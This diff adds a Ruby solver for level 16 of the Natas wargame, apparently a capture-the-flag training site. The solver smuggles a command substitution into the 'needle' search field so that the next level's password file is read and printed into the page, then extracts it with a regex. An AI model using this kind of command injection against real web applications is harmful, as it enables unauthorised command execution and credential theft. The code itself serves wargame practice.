@@ -501,4 +501,20 @@ end
 # Level 16
 class NatasLevel16 < NatasLevelBase
   LEVEL = 16
+  PAGE = '/'
+  PAYLOAD = %(NON_EXIST $(cat #{WEBPASS}/natas17 > /proc/$$/fd/1))
+
+  def exec
+    query = URI.encode_www_form('needle' => PAYLOAD)
+    data = get("#{PAGE}?#{query}").body
+    match = %r(<pre>\n(\w{32})\n</pre>).match(data)
+    not_found unless match
+    found(match[1])
+  end
+end
+
+##
+# Level 17
+class NatasLevel17 < NatasLevelBase
+  LEVEL = 17
 end
